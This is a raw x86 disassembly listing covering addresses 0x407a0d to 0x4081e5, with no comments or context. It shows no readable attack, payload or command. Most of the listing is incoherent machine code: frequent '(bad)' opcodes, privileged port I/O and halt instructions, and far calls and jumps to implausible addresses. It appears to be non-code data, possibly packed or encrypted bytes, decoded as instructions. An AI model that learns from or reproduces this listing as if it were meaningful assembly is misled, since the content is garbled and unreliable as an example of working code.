  407a0d:	icebp  
  407a0e:	dec    ecx
  407a0f:	jmp    0x407a5e
  407a11:	sub    DWORD PTR [ebp+0x766ff4a3],edx
  407a17:	jmp    0x9a88f662
  407a1c:	push   ecx
  407a1d:	xor    eax,0x939c6e61
  407a22:	inc    ecx
  407a23:	lods   al,BYTE PTR ds:[esi]
  407a24:	and    edi,0x642ef0b1
  407a2a:	cmp    ah,0xfe
  407a2d:	in     eax,dx
  407a2e:	or     eax,0x752c61f0
  407a33:	push   ecx
  407a34:	loope  0x407a33
  407a36:	cmp    edi,DWORD PTR [esi+0x510fd33f]
  407a3c:	int3   
  407a3d:	inc    eax
  407a3e:	dec    edi
  407a3f:	sbb    BYTE PTR [ecx+0xf],ch
  407a42:	xor    ah,ah
  407a44:	shr    BYTE PTR [ebp+0x29],0x3d
  407a48:	jns    0x407abf
  407a4a:	(bad)  
  407a4b:	std    
  407a4c:	jns    0x407aa7
  407a4e:	test   ecx,esi
  407a50:	xor    DWORD PTR [ebp-0x75db6dbb],ebp
  407a56:	fwait
  407a57:	test   al,0x0
  407a59:	stos   BYTE PTR es:[edi],al
  407a5a:	mov    al,0x44
  407a5c:	xchg   BYTE PTR [ebx-0x3dc4647b],cl
  407a62:	in     al,dx
  407a63:	aam    0x9b
  407a65:	imul   eax,DWORD PTR [ebp+0x56],0x28
  407a69:	cmp    DWORD PTR [edx],ecx
  407a6b:	and    al,0xc
  407a6d:	scas   al,BYTE PTR es:[edi]
  407a6e:	ss test eax,0x3a03adad
  407a74:	sub    esp,DWORD PTR [esp+edx*4+0x735277e9]
  407a7b:	pop    es
  407a7c:	retf   0x227d
  407a7f:	adc    BYTE PTR [eax],bh
  407a81:	push   cs
  407a82:	outs   dx,BYTE PTR ds:[esi]
  407a83:	daa    
  407a84:	xchg   esp,eax
  407a85:	imul   ecx,esi,0xfffffff9
  407a88:	xor    al,BYTE PTR [edx]
  407a8a:	ror    DWORD PTR [ecx],0x4
  407a8d:	js     0x407a18
  407a8f:	inc    ebp
  407a90:	iret   
  407a91:	mov    ch,0x82
  407a93:	call   0x84fb:0x13486827
  407a9a:	mov    BYTE PTR [edx+0x3a2a48c7],bh
  407aa0:	mov    edi,0x1d130bb3
  407aa5:	cmp    edi,ecx
  407aa7:	aam    0xf9
  407aa9:	pushf  
  407aaa:	dec    ebp
  407aab:	mov    ds:0xb4420f25,eax
  407ab0:	cld    
  407ab1:	clc    
  407ab2:	ins    DWORD PTR es:[edi],dx
  407ab3:	sbb    edi,0x28
  407ab6:	fcos   
  407ab8:	jle    0x407a3c
  407aba:	and    ah,BYTE PTR [ecx+0x77]
  407abd:	cmc    
  407abe:	cmp    dh,bl
  407ac0:	adc    al,0x8a
  407ac2:	inc    edx
  407ac3:	mov    al,ds:0x4d1fda5b
  407ac8:	sub    eax,0xf4a1918
  407acd:	push   ebx
  407ace:	mov    ds:0xe8533206,al
  407ad3:	jle    0x407b53
  407ad5:	pusha  
  407ad6:	(bad)  
  407ad7:	out    dx,al
  407ad8:	sbb    al,0xe3
  407ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407adb:	and    BYTE PTR [edx+eiz*2+0x4e],cl
  407adf:	jmp    0x7013e03a
  407ae4:	std    
  407ae5:	inc    ebx
  407ae6:	out    0x14,al
  407ae8:	inc    esi
  407ae9:	iret   
  407aea:	and    eax,0x81ca810e
  407aef:	cmp    dh,dh
  407af1:	ror    DWORD PTR [edx],0x94
  407af4:	inc    ebp
  407af5:	hlt    
  407af6:	sub    eax,0x45080974
  407afb:	lds    edx,FWORD PTR [esi+0x7aa9d19]
  407b01:	pop    ss
  407b02:	ja     0x407b50
  407b04:	mov    ch,BYTE PTR [edi-0x39]
  407b07:	adc    eax,0x4c846163
  407b0c:	mov    dl,0x58
  407b0e:	out    dx,al
  407b0f:	jl     0x407b05
  407b11:	sub    dl,BYTE PTR [edi-0x29362537]
  407b17:	sbb    BYTE PTR [ebx-0x1cef9ab4],0xee
  407b1e:	adc    al,0xf3
  407b20:	xchg   esi,eax
  407b21:	retf   0xfbe5
  407b24:	mov    ebp,0x95615f32
  407b29:	sbb    al,0x73
  407b2b:	fwait
  407b2c:	xlat   BYTE PTR ds:[ebx]
  407b2d:	xor    bl,BYTE PTR [esi+0x1398a430]
  407b33:	and    DWORD PTR [edx],ebp
  407b35:	lea    esp,ss:[edx-0x52]
  407b39:	(bad)  
  407b3a:	mov    ecx,0xf7327e80
  407b3f:	mov    cl,al
  407b41:	cmp    eax,0x2b143e63
  407b46:	mov    edx,0x9e1bd78e
  407b4b:	fwait
  407b4c:	mov    al,ds:0x595c3ea1
  407b51:	xlat   BYTE PTR ds:[ebx]
  407b52:	leave  
  407b53:	loopne 0x407b03
  407b55:	push   esi
  407b56:	inc    edi
  407b57:	test   eax,0x3b0da7f3
  407b5c:	jg     0x407b9f
  407b5e:	sahf   
  407b5f:	sub    DWORD PTR [ebp-0x1b],0xffffff91
  407b63:	mov    esi,DWORD PTR [ebx]
  407b65:	pop    es
  407b66:	loop   0x407b17
  407b68:	push   cs
  407b69:	add    eax,0xdc5ccabb
  407b6e:	mov    dh,BYTE PTR ds:0x40431a75
  407b74:	push   edx
  407b75:	and    eax,0xffffff93
  407b78:	xchg   esp,eax
  407b79:	dec    esp
  407b7a:	push   esp
  407b7b:	mov    edi,0x98351118
  407b80:	xchg   esi,eax
  407b81:	jge    0x407beb
  407b83:	in     eax,0xf8
  407b85:	jb     0x407b6c
  407b87:	and    eax,0x4ec021ce
  407b8c:	pop    edx
  407b8d:	push   es
  407b8e:	shl    ah,cl
  407b90:	sbb    eax,0x6fea4fb
  407b95:	push   es
  407b96:	push   eax
  407b97:	lahf   
  407b98:	mov    al,ds:0xfa4ada2c
  407b9d:	(bad)  
  407b9f:	test   DWORD PTR [ebx+0x61],edx
  407ba2:	sti    
  407ba3:	cmp    DWORD PTR [esi],edi
  407ba5:	fcom   QWORD PTR [edx+0x23de15b]
  407bab:	inc    esi
  407bac:	adc    BYTE PTR [esi+0x12af96f8],0x5a
  407bb3:	adc    al,0xbb
  407bb5:	ret    
  407bb6:	sbb    DWORD PTR [edi+0x7ae3be03],ebp
  407bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bbd:	fisub  WORD PTR [edi]
  407bbf:	add    eax,0xdd5ce907
  407bc4:	(bad)  
  407bc5:	enter  0xd0ba,0x44
  407bc9:	(bad)  
  407bca:	xor    ebx,DWORD PTR [edx-0xa858b5d]
  407bd0:	lock fld TBYTE PTR [edx+0x1c]
  407bd4:	and    DWORD PTR [ebx],0x1a99aa13
  407bda:	xchg   edx,eax
  407bdb:	jmp    0x7015:0xe7b0719
  407be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407be3:	cmc    
  407be4:	mov    edx,0x6be32e80
  407be9:	or     DWORD PTR [ebx],ebx
  407beb:	call   0xfa5a:0xd4fd8501
  407bf2:	loope  0x407bb5
  407bf4:	repz aad 0xe5
  407bf7:	pop    esp
  407bf8:	mov    esp,0x332b6ce4
  407bfd:	fcom   QWORD PTR [edi+0x5]
  407c00:	retf   0xa693
  407c03:	fld    QWORD PTR [esp+ebx*8-0x719ae8b9]
  407c0a:	imul   ecx,DWORD PTR [edi],0x9d4ae5a1
  407c10:	pop    ds
  407c11:	cmc    
  407c12:	or     DWORD PTR [ebx-0x79926be0],ebp
  407c18:	test   BYTE PTR [esp+eiz*2+0x55],bl
  407c1c:	mov    ch,0x68
  407c1e:	fucomip st,st(7)
  407c20:	pop    edx
  407c21:	repnz mov edi,DWORD PTR [ecx*4-0x4dd0d6d9]
  407c29:	sbb    edi,0xffffff9b
  407c2c:	mov    eax,ds:0x42e2b7
  407c31:	dec    edx
  407c32:	jmp    0x409f81
  407c37:	mov    al,0x4e
  407c39:	cmp    bh,ch
  407c3b:	mov    ds:0xc733738b,al
  407c40:	sbb    BYTE PTR ds:0x8eb3cde6,cl
  407c46:	xchg   ebx,eax
  407c47:	push   es
  407c48:	cmp    bh,BYTE PTR [esp+edi*2+0x4e]
  407c4c:	pop    edi
  407c4d:	jl     0x407ccb
  407c4f:	repz ffreep st(2)
  407c52:	rcl    BYTE PTR [edx-0x18],0x4d
  407c56:	ficom  WORD PTR [esi]
  407c58:	mov    dh,0x1f
  407c5a:	push   cs
  407c5b:	sub    al,0x96
  407c5d:	dec    ebp
  407c5e:	dec    ebp
  407c5f:	mov    eax,0x144fa73b
  407c64:	and    BYTE PTR [esi],bl
  407c66:	cmc    
  407c67:	xchg   edi,eax
  407c68:	sahf   
  407c69:	push   edi
  407c6a:	neg    BYTE PTR [di]
  407c6d:	aaa    
  407c6e:	test   BYTE PTR [ecx],bh
  407c70:	mov    al,0x5d
  407c72:	push   edx
  407c73:	xchg   edi,eax
  407c74:	idiv   BYTE PTR [esi]
  407c76:	mov    esp,0x1ea53562
  407c7b:	les    eax,FWORD PTR [esi]
  407c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c7e:	bsr    ebx,ecx
  407c81:	js     0x407c83
  407c83:	jmp    0xad35:0xf4451b14
  407c8a:	cmp    BYTE PTR [ebp+0x2c],al
  407c8d:	adc    bh,al
  407c8f:	mov    fs,WORD PTR [edx+esi*8]
  407c92:	or     al,0x6f
  407c94:	pop    edx
  407c95:	add    edi,esp
  407c97:	scas   eax,DWORD PTR es:[edi]
  407c98:	xchg   esi,eax
  407c99:	retf   
  407c9a:	jg     0x407d11
  407c9c:	lahf   
  407c9d:	outs   dx,DWORD PTR ds:[esi]
  407c9e:	push   edx
  407c9f:	dec    edi
  407ca0:	and    BYTE PTR [edi+0x79de4b09],al
  407ca6:	popa   
  407ca7:	call   0xc0b3097a
  407cac:	add    eax,0xc275010d
  407cb1:	xor    al,0x81
  407cb3:	or     bl,dl
  407cb5:	jbe    0x407c47
  407cb7:	call   0x805cfcf7
  407cbc:	ret    
  407cbd:	js     0x407d27
  407cbf:	aaa    
  407cc0:	pop    ds
  407cc1:	sbb    BYTE PTR [eax],0x77
  407cc4:	and    al,0xbb
  407cc6:	push   esp
  407cc7:	jl     0x407cca
  407cc9:	xor    al,0x32
  407ccb:	xor    DWORD PTR [edx+0xe0cce3f],ebx
  407cd1:	aaa    
  407cd2:	fwait
  407cd3:	jg     0x407ccb
  407cd5:	test   al,0x49
  407cd7:	sub    eax,0xef033bcc
  407cdc:	fldcw  WORD PTR [esi+0x2b534985]
  407ce2:	push   ds
  407ce3:	xchg   ecx,edx
  407ce5:	sbb    al,0xcf
  407ce7:	hlt    
  407ce8:	imul   edx,eax,0x55c38ef4
  407cee:	dec    ebp
  407cef:	push   ecx
  407cf0:	add    eax,0x7adb5364
  407cf5:	mov    edi,0xa71a8291
  407cfa:	pop    edx
  407cfb:	aaa    
  407cfc:	xchg   edi,eax
  407cfd:	xor    ecx,DWORD PTR [ebx-0xd]
  407d00:	sbb    al,0xde
  407d02:	inc    ecx
  407d03:	sub    al,0xe
  407d05:	ds cmp eax,0x1bd29b57
  407d0b:	mov    bh,0xfd
  407d0d:	lahf   
  407d0e:	in     eax,0x22
  407d10:	gs pop ss
  407d12:	(bad)  
  407d14:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  407d16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d17:	clc    
  407d18:	fnsave [ecx-0x7fbabf3d]
  407d1e:	xlat   BYTE PTR ds:[ebx]
  407d1f:	jg     0x407d18
  407d21:	dec    edi
  407d22:	sbb    ah,dl
  407d24:	repz icebp 
  407d26:	sbb    BYTE PTR [ebp-0x4c],0x93
  407d2a:	cmc    
  407d2b:	mov    dl,0x57
  407d2d:	call   0x2fdaac46
  407d32:	push   eax
  407d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d34:	ds pop eax
  407d36:	push   edi
  407d37:	dec    edi
  407d38:	outs   dx,BYTE PTR ds:[esi]
  407d39:	pop    ebx
  407d3a:	dec    esp
  407d3b:	fwait
  407d3c:	inc    ebp
  407d3d:	inc    eax
  407d3e:	out    0x15,al
  407d40:	pop    ebx
  407d41:	pop    ebx
  407d42:	pushw  0x3a
  407d45:	cwde   
  407d46:	push   edi
  407d47:	mov    edx,0x66aa9d7b
  407d4c:	mov    esp,0xc3a07a04
  407d51:	cmp    eax,DWORD PTR [ebx+0x28]
  407d54:	xchg   edi,eax
  407d55:	push   edi
  407d56:	jb     0x407d7f
  407d58:	xor    BYTE PTR [ebx],ch
  407d5a:	lock push 0x4c4677a9
  407d60:	not    DWORD PTR [ebx-0x25a1026b]
  407d66:	pop    edi
  407d67:	sbb    BYTE PTR [esi+0x6864ee6f],bl
  407d6d:	adc    eax,0x8416f857
  407d72:	mov    edx,0xe839e09e
  407d77:	ins    BYTE PTR es:[edi],dx
  407d78:	push   ecx
  407d79:	and    al,0x30
  407d7b:	mov    edx,0x7c7aa428
  407d80:	mov    eax,DWORD PTR [edi]
  407d82:	jp     0x407d87
  407d84:	dec    ebp
  407d85:	(bad)  
  407d87:	inc    ecx
  407d88:	adc    DWORD PTR [ecx+0x28],edi
  407d8b:	push   ebp
  407d8c:	push   0x2470969b
  407d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d92:	dec    ebx
  407d93:	aam    0x14
  407d95:	cdq    
  407d96:	mov    BYTE PTR [esi-0x37],cl
  407d99:	jmp    0x407d3f
  407d9b:	imul   esi,ebp,0xffffffcf
  407d9e:	sub    BYTE PTR [ebx+ebp*8],bh
  407da1:	sbb    edx,DWORD PTR [ebx]
  407da3:	add    edi,DWORD PTR [edx-0x65]
  407da6:	mov    eax,0x4f7c7043
  407dab:	repz mov al,ds:0xa2aa4f5d
  407db1:	hlt    
  407db2:	adc    dl,BYTE PTR [esi-0x7d]
  407db5:	shl    BYTE PTR [eax+0x6f],cl
  407db8:	jnp    0x407dab
  407dba:	loop   0x407e29
  407dbc:	xchg   DWORD PTR [esi],ebp
  407dbe:	and    bl,BYTE PTR [edi-0x45272ff2]
  407dc4:	mov    DWORD PTR [eax-0x79],eax
  407dc7:	ja     0x407e33
  407dc9:	mov    dl,ah
  407dcb:	dec    esp
  407dcc:	sub    esp,DWORD PTR [esi+0x17d420d2]
  407dd2:	scas   eax,DWORD PTR es:[edi]
  407dd3:	loope  0x407da9
  407dd5:	scas   al,BYTE PTR es:[edi]
  407dd6:	scas   al,BYTE PTR es:[edi]
  407dd7:	pop    edi
  407dd8:	popf   
  407dd9:	jne    0x407df0
  407ddb:	add    al,0x80
  407ddd:	sbb    dl,BYTE PTR [eax]
  407ddf:	or     ebx,DWORD PTR [edi-0x62]
  407de2:	call   0x6c0b:0x9286042
  407de9:	test   al,0xe3
  407deb:	or     edx,DWORD PTR ds:0x2a7ea6a9
  407df1:	sbb    dh,BYTE PTR [ebx-0x626341bc]
  407df7:	mov    ecx,0x316d77cf
  407dfc:	rcl    BYTE PTR ds:0x75284dad,1
  407e02:	lods   eax,DWORD PTR ds:[esi]
  407e03:	or     eax,0xc93ffe80
  407e08:	inc    ecx
  407e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e0a:	pop    es
  407e0b:	xor    esp,esi
  407e0d:	lds    ebp,FWORD PTR [ebx+esi*2]
  407e10:	shl    ebp,1
  407e12:	mov    ebp,0xfe32c92
  407e17:	xchg   ebp,eax
  407e18:	in     eax,0xed
  407e1a:	xor    BYTE PTR [edx],dl
  407e1c:	hlt    
  407e1d:	inc    edx
  407e1e:	mov    eax,0xd25b95b2
  407e23:	jmp    0x8c02e257
  407e28:	int    0x50
  407e2a:	icebp  
  407e2b:	push   esi
  407e2c:	pusha  
  407e2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e2e:	adc    DWORD PTR gs:[esi+0x663f55e1],ecx
  407e35:	daa    
  407e36:	dec    edi
  407e37:	hlt    
  407e38:	cmp    al,0x14
  407e3a:	cmp    al,0x72
  407e3c:	mov    ah,0xe3
  407e3e:	push   ds
  407e3f:	sbb    ebx,ebx
  407e41:	pushf  
  407e42:	(bad)
  407e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e46:	jae    0x407e19
  407e48:	add    dh,ch
  407e4a:	dec    edx
  407e4b:	fidivr DWORD PTR [edi-0x3b9faa43]
  407e51:	fs adc al,0xeb
  407e54:	inc    edi
  407e55:	mov    eax,0x3b17c7d0
  407e5a:	cwde   
  407e5b:	aad    0x23
  407e5d:	xlat   BYTE PTR ds:[ebx]
  407e5e:	dec    eax
  407e5f:	cmc    
  407e60:	pop    esi
  407e61:	ret    
  407e62:	ret    
  407e63:	lds    eax,FWORD PTR [esi+ebp*2+0x32]
  407e67:	add    BYTE PTR [ecx+0x49],al
  407e6a:	stos   DWORD PTR es:[edi],eax
  407e6b:	pusha  
  407e6c:	int    0x1
  407e6e:	cmc    
  407e6f:	adc    DWORD PTR [eax-0x72],ebp
  407e72:	mov    dh,0xa
  407e74:	xchg   ecx,eax
  407e75:	stos   DWORD PTR es:[edi],eax
  407e76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e77:	push   cs
  407e78:	dec    ebx
  407e79:	loop   0x407e7a
  407e7b:	and    al,0xf4
  407e7d:	pop    ds
  407e7e:	ds lahf 
  407e80:	add    edx,esi
  407e82:	neg    BYTE PTR [eax+0x66f67b48]
  407e88:	fdiv   DWORD PTR [esi+eiz*4+0xf]
  407e8c:	or     eax,0x602e097d
  407e91:	cs mov esi,0xcf34deb0
  407e97:	ss ds aaa 
  407e9a:	dec    edx
  407e9b:	dec    esp
  407e9c:	arpl   si,cx
  407e9e:	outs   dx,BYTE PTR ds:[esi]
  407e9f:	push   ecx
  407ea0:	push   ebp
  407ea1:	faddp  st(6),st
  407ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ea4:	add    esp,DWORD PTR [esi-0x313ef202]
  407eaa:	jle    0x407e60
  407eac:	jbe    0x407e89
  407eae:	mov    eax,0x50e854e6
  407eb3:	pushf  
  407eb4:	and    bl,BYTE PTR [eax]
  407eb6:	out    dx,al
  407eb7:	xor    BYTE PTR [edi+0x75],cl
  407eba:	test   eax,0x82d34ea1
  407ebf:	pop    ss
  407ec0:	shr    DWORD PTR [edx],1
  407ec2:	and    DWORD PTR [esi+0x6359e1bc],eax
  407ec8:	sbb    al,0xb4
  407eca:	shl    DWORD PTR [edx+0x742cf49c],1
  407ed0:	outs   dx,BYTE PTR ds:[esi]
  407ed1:	cs mov ebx,0xcbec9857
  407ed7:	out    dx,al
  407ed8:	lods   al,BYTE PTR ds:[esi]
  407ed9:	ja     0x407f4f
  407edb:	jl     0x407e6f
  407edd:	cmp    eax,0x560da265
  407ee2:	sar    DWORD PTR [ebp+0x1f],0xbd
  407ee6:	xchg   edi,eax
  407ee7:	push   ecx
  407ee8:	fnstenv [esp+ecx*2-0x51]
  407eec:	ins    BYTE PTR es:[edi],dx
  407eed:	sti    
  407eee:	push   esi
  407eef:	mov    cl,0x97
  407ef1:	je     0x407f12
  407ef3:	neg    BYTE PTR [ebx-0x1a61c429]
  407ef9:	loop   0x407f37
  407efb:	or     DWORD PTR [edi+eax*4+0x76],esi
  407eff:	xchg   dl,al
  407f01:	push   0xc8a0d640
  407f06:	cld    
  407f07:	out    0x4,eax
  407f09:	mov    dh,0x5c
  407f0b:	push   ss
  407f0c:	aad    0x33
  407f0e:	pop    ebp
  407f0f:	dec    esi
  407f10:	fst    DWORD PTR [eax-0x42b5be54]
  407f16:	fsub   st(4),st
  407f18:	call   0xf2e503d5
  407f1d:	or     cl,ah
  407f1f:	arpl   WORD PTR [ecx-0x45],bp
  407f22:	leave  
  407f23:	adc    BYTE PTR [ebx+0x64],0xf6
  407f27:	xchg   esp,eax
  407f28:	xor    eax,esp
  407f2a:	or     DWORD PTR [ebx+eax*4],esi
  407f2d:	jno    0x407ec7
  407f2f:	sbb    BYTE PTR [edi+0x2b6bd9a],bh
  407f35:	(bad)  
  407f37:	jp     0x407f82
  407f39:	repz inc BYTE PTR [edx+0x3d]
  407f3d:	sahf   
  407f3e:	pop    ecx
  407f3f:	out    0xb5,eax
  407f41:	fist   WORD PTR [eax+0x14]
  407f44:	fiadd  DWORD PTR [esi-0xc61476b]
  407f4a:	inc    eax
  407f4b:	xchg   ecx,eax
  407f4c:	retf   0x127c
  407f4f:	inc    eax
  407f50:	int3   
  407f51:	mov    ebp,0x9e4dc84e
  407f56:	adc    DWORD PTR [ecx],0x15c7e116
  407f5c:	(bad)  
  407f5d:	xchg   esi,eax
  407f5e:	sbb    dl,0x55
  407f61:	clc    
  407f62:	sbb    cl,ah
  407f64:	push   eax
  407f65:	pop    ecx
  407f66:	sub    al,0xd6
  407f68:	mov    DWORD PTR [ecx],0x3ec774e8
  407f6e:	push   ebx
  407f6f:	test   eax,0xdebfc942
  407f74:	pop    ds
  407f75:	dec    esi
  407f76:	sbb    DWORD PTR [ebp+0x54ae7b4e],ebp
  407f7c:	sbb    al,0xf0
  407f7e:	les    ecx,FWORD PTR [edx+0x34]
  407f81:	int3   
  407f82:	or     DWORD PTR [ebx-0x1c],ebp
  407f85:	imul   edx,edx,0xa657269f
  407f8b:	inc    esp
  407f8c:	ds (bad) 
  407f8e:	mov    al,0x57
  407f90:	imul   edi,DWORD PTR [ebx+esi*2],0x7b
  407f94:	sar    DWORD PTR [esi+0x63c90067],1
  407f9a:	push   0x15be4cef
  407f9f:	adc    edi,DWORD PTR [esp+esi*4-0x11eebf65]
  407fa6:	mov    eax,0xd778ada
  407fab:	arpl   WORD PTR [esi-0x38],sp
  407fae:	shr    DWORD PTR [edx],0xea
  407fb1:	pop    ebx
  407fb2:	xor    eax,0xbbe887de
  407fb7:	fld    DWORD PTR [edi-0x69d9900]
  407fbd:	es push ebp
  407fbf:	jns    0x407ffa
  407fc1:	mov    al,ds:0x8251e2e6
  407fc6:	ficomp DWORD PTR [edi]
  407fc8:	sub    al,0x91
  407fca:	dec    ebx
  407fcb:	lahf   
  407fcc:	cli    
  407fcd:	mov    dl,0xe0
  407fcf:	add    eax,0xc43f3e9
  407fd4:	dec    ecx
  407fd5:	xor    al,0xb9
  407fd7:	out    0x25,al
  407fd9:	mov    edi,0x6f260bda
  407fde:	fcmovbe st,st(0)
  407fe0:	and    al,0xd
  407fe2:	dec    esp
  407fe3:	mov    cl,0xd3
  407fe5:	repz cmp ecx,DWORD PTR [edi]
  407fe8:	add    eax,edx
  407fea:	loopne 0x40805d
  407fec:	mov    ds:0x3de87e1f,al
  407ff1:	ficom  WORD PTR [ebx+0x57]
  407ff4:	and    BYTE PTR [eax+eax*8],ah
  407ff7:	push   ecx
  407ff8:	lods   eax,DWORD PTR ds:[esi]
  407ff9:	pop    edx
  407ffa:	and    BYTE PTR [ebx-0x51eeabd5],bh
  408000:	in     al,dx
  408001:	mov    dh,0x5
  408003:	add    eax,0x18a09229
  408008:	sbb    eax,DWORD PTR [ecx+0x1a492b4d]
  40800e:	mov    edi,0x6ad7273c
  408013:	fwait
  408014:	push   ds
  408015:	adc    eax,0xbf062578
  40801a:	lods   al,BYTE PTR ds:[esi]
  40801b:	push   edi
  40801c:	outs   dx,BYTE PTR ds:[esi]
  40801d:	inc    edi
  40801e:	icebp  
  40801f:	pop    edi
  408020:	xchg   esi,eax
  408021:	mov    BYTE PTR [esi-0x58],dh
  408024:	mov    ebp,0xe0bcb953
  408029:	jp     0x408065
  40802b:	dec    ebp
  40802c:	fstp   DWORD PTR [esi-0x60e9f621]
  408032:	sar    DWORD PTR [ebx+edi*4],1
  408035:	js     0x4080b3
  408037:	jnp    0x408058
  408039:	inc    ebx
  40803a:	in     al,0xaa
  40803c:	or     al,0x2b
  40803e:	jnp    0x407fd6
  408040:	iret   
  408041:	cmp    ebx,DWORD PTR [eax-0x32]
  408044:	test   al,0x23
  408046:	sar    esi,1
  408048:	addr16 stc 
  40804a:	mov    al,0x7e
  40804c:	and    edx,esp
  40804e:	push   ss
  40804f:	or     BYTE PTR [ebp+0x272fd22a],0xdb
  408056:	ins    DWORD PTR es:[edi],dx
  408057:	frstor [eax+0x6c]
  40805a:	jle    0x407ffe
  40805c:	stos   BYTE PTR es:[edi],al
  40805d:	stc    
  40805e:	push   0x1b
  408060:	sub    bl,dl
  408062:	add    cl,BYTE PTR [esi]
  408064:	pop    ecx
  408065:	jle    0x40805d
  408067:	iret   
  408068:	add    dl,BYTE PTR [ebx-0x415576fa]
  40806e:	jo     0x40801b
  408070:	dec    BYTE PTR [ecx-0xa]
  408073:	or     eax,DWORD PTR [ecx+0x5083066d]
  408079:	int3   
  40807a:	or     eax,0x385d14ef
  40807f:	out    dx,eax
  408080:	div    DWORD PTR [ebp+0x4e]
  408083:	stos   DWORD PTR es:[edi],eax
  408084:	push   es
  408085:	je     0x4080ff
  408087:	call   0x7304449d
  40808c:	inc    esp
  40808d:	pusha  
  40808e:	sbb    al,0xa
  408090:	aad    0xcf
  408092:	inc    ebp
  408093:	mov    edx,0x2c11fb5e
  408098:	cmp    al,0xc1
  40809a:	int    0xe
  40809c:	repz mov esp,0xf91850c2
  4080a2:	test   ch,0xe6
  4080a5:	lods   al,BYTE PTR ds:[esi]
  4080a6:	(bad)  
  4080a7:	ja     0x4080c7
  4080a9:	sti    
  4080aa:	adc    esi,eax
  4080ac:	dec    ebp
  4080ad:	cli    
  4080ae:	push   ss
  4080af:	loope  0x4080dc
  4080b1:	sub    esi,DWORD PTR [ebx]
  4080b3:	pop    ss
  4080b4:	out    0x3f,eax
  4080b6:	call   0x241a:0x1e0dc781
  4080bd:	jno    0x4080e5
  4080bf:	cdq    
  4080c0:	adc    edx,DWORD PTR [edi-0x1f596b9d]
  4080c6:	xchg   ebx,eax
  4080c7:	fdiv   QWORD PTR [ebp-0x148bdaf6]
  4080cd:	pop    es
  4080ce:	aas    
  4080cf:	or     eax,0x3ffcd301
  4080d4:	fild   WORD PTR [ecx+0x3b]
  4080d7:	sub    eax,0xb452c1bd
  4080dc:	out    0x93,eax
  4080de:	mov    ebx,0xd46361e7
  4080e3:	adc    eax,0xbae80a8d
  4080e8:	ror    BYTE PTR [eax+ebx*4],0xe
  4080ec:	in     al,dx
  4080ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080ee:	mov    ecx,0x667b406d
  4080f3:	retf   0x304d
  4080f6:	jbe    0x4080a8
  4080f8:	outs   dx,DWORD PTR ds:[si]
  4080fa:	pop    ebp
  4080fb:	hlt    
  4080fc:	pop    eax
  4080fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080fe:	int    0x2b
  408100:	ja     0x40812c
  408102:	mov    cl,BYTE PTR [eax-0x39f2cb37]
  408108:	add    edx,DWORD PTR [ecx+0x204b8824]
  40810e:	lods   eax,DWORD PTR ds:[esi]
  40810f:	loope  0x408167
  408111:	test   al,0xed
  408113:	loop   0x4080ed
  408115:	add    ecx,DWORD PTR [ecx-0x11]
  408118:	xor    DWORD PTR [edx+0x277cc1fc],ecx
  40811e:	rcr    DWORD PTR [esi-0x3641e52a],0x49
  408125:	aaa    
  408126:	jne    0x4081a7
  408128:	fld    QWORD PTR ds:0x42e9a9e0
  40812e:	mov    gs,ecx
  408130:	pop    esp
  408131:	cmc    
  408132:	push   esp
  408133:	xchg   esi,eax
  408134:	in     eax,0xe3
  408136:	dec    esp
  408137:	cs add eax,0xbda2e664
  40813d:	in     eax,dx
  40813e:	add    esi,edi
  408140:	lahf   
  408141:	or     bl,BYTE PTR [eax-0x3ac99835]
  408147:	imul   edi,DWORD PTR [bp-0x1f],0xacce23ee
  40814f:	test   DWORD PTR [edi],ebp
  408151:	daa    
  408152:	popf   
  408153:	cmp    DWORD PTR [edi-0x2950c504],ebx
  408159:	in     eax,dx
  40815a:	pop    es
  40815b:	ja     0x4080fd
  40815d:	xor    esi,DWORD PTR [esi-0x44]
  408160:	xchg   esi,eax
  408161:	push   0xe6401451
  408166:	aad    0x78
  408168:	js     0x408184
  40816a:	inc    eax
  40816b:	out    dx,al
  40816c:	push   ds
  40816d:	nop
  40816e:	add    ecx,eax
  408170:	pop    edi
  408171:	sar    ch,0xaa
  408174:	outs   dx,BYTE PTR ds:[esi]
  408175:	sbb    al,0x92
  408177:	push   ds
  408178:	push   eax
  408179:	fbstp  TBYTE PTR [esi]
  40817b:	lea    esi,[ebp-0x57]
  40817e:	ja     0x4081c9
  408180:	push   esi
  408181:	add    edi,edi
  408183:	in     al,dx
  408184:	mov    BYTE PTR [edi+0x2fdb65f3],bh
  40818a:	lds    esi,FWORD PTR [eax-0x4f40938d]
  408190:	jg     0x4081cd
  408192:	push   ebp
  408193:	mov    al,BYTE PTR [ecx]
  408195:	int3   
  408196:	punpckhwd mm6,mm2
  408199:	call   0xf15d7c4e
  40819e:	inc    ecx
  4081a0:	rcr    esp,cl
  4081a2:	jmp    0xed857c9b
  4081a7:	fidivr DWORD PTR [edi]
  4081a9:	mov    ebp,0x737e898b
  4081ae:	call   0xfebe38f7
  4081b3:	push   edi
  4081b4:	out    dx,al
  4081b5:	aad    0xf9
  4081b7:	call   0x2804:0x46b86307
  4081be:	rcr    BYTE PTR ds:0x29bed656,0xea
  4081c5:	jp     0x408184
  4081c7:	outs   dx,BYTE PTR ds:[esi]
  4081c8:	popa   
  4081c9:	xor    edi,ebx
  4081cb:	icebp  
  4081cc:	fsub   QWORD PTR [ebp+0x511130f0]
  4081d2:	xchg   edi,eax
  4081d3:	cmp    esi,DWORD PTR [ecx*2-0xac14e9e]
  4081da:	(bad)  
  4081db:	ds std 
  4081dd:	(bad)  
  4081de:	fsub   QWORD PTR [ecx+0x54]
  4081e1:	pop    ds
  4081e2:	js     0x4081f1
  4081e4:	push   eax
  4081e5:	xchg   ecx,eax
